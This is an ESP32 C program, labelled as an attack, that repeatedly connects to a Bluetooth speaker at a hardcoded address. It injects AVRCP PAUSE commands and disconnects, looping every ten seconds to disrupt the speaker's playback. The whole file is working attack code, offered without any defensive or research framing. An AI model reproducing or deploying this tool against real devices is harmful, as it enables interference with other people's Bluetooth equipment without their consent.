// speaker_exploit.c - ESP32 attack: wait for speaker to disconnect and hijack with AVRCP PAUSE

#include "nvs_flash.h"
#include "esp_bt.h"
#include "esp_log.h"
#include "esp_bt_main.h"
#include "esp_bt_device.h"
#include "esp_gap_bt_api.h"
#include "esp_a2dp_api.h"
#include "esp_avrc_api.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>

static const char *TAG = "BT_AVRCP_ATTACK";

static const esp_bd_addr_t target_bda = {0x20, 0x18, 0x5b, 0x66, 0x48, 0x9f};

static void bt_app_avrc_metadata_cb(esp_avrc_ct_cb_event_t event, esp_avrc_ct_cb_param_t *param) {}

static void bt_app_a2d_cb(esp_a2d_cb_event_t event, esp_a2d_cb_param_t *param) {
    switch (event) {
        case ESP_A2D_CONNECTION_STATE_EVT: {
            if (param->conn_stat.state == ESP_A2D_CONNECTION_STATE_CONNECTED) {
                ESP_LOGI(TAG, "Connected to speaker. Injecting PAUSE command.");
                esp_avrc_ct_send_passthrough_cmd(0, ESP_AVRC_PT_CMD_PAUSE, ESP_AVRC_PT_CMD_STATE_PRESSED);
                esp_avrc_ct_send_passthrough_cmd(0, ESP_AVRC_PT_CMD_PAUSE, ESP_AVRC_PT_CMD_STATE_RELEASED);
                vTaskDelay(pdMS_TO_TICKS(500));
                esp_a2d_source_disconnect(param->conn_stat.remote_bda);
            } else {
                ESP_LOGI(TAG, "A2DP connection state: %d", param->conn_stat.state);
            }
            break;
        }
        default:
            break;
    }
}

void attack_task(void *arg) {
    while (true) {
        ESP_LOGI(TAG, "Trying to connect to speaker...");
        esp_err_t err = esp_a2d_source_connect(target_bda);
        if (err != ESP_OK) {
            ESP_LOGW(TAG, "Connection failed (likely already paired), will retry in 10s");
        }
        vTaskDelay(pdMS_TO_TICKS(10000));
    }
}

void app_main(void) {
    ESP_ERROR_CHECK(nvs_flash_init());

    ESP_ERROR_CHECK(esp_bt_controller_mem_release(ESP_BT_MODE_BLE));
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_bt_controller_init(&bt_cfg));
    ESP_ERROR_CHECK(esp_bt_controller_enable(ESP_BT_MODE_CLASSIC_BT));

    ESP_ERROR_CHECK(esp_bluedroid_init());
    ESP_ERROR_CHECK(esp_bluedroid_enable());

    ESP_ERROR_CHECK(esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_GENERAL_DISCOVERABLE));
    ESP_ERROR_CHECK(esp_bt_dev_set_device_name("ESP32_AVRCP_ATTACKER"));

    ESP_ERROR_CHECK(esp_a2d_register_callback(bt_app_a2d_cb));
    ESP_ERROR_CHECK(esp_a2d_source_init());

    ESP_ERROR_CHECK(esp_avrc_ct_init());
    ESP_ERROR_CHECK(esp_avrc_ct_register_callback(bt_app_avrc_metadata_cb));

    xTaskCreate(attack_task, "attack_task", 4096, NULL, 5, NULL);
}
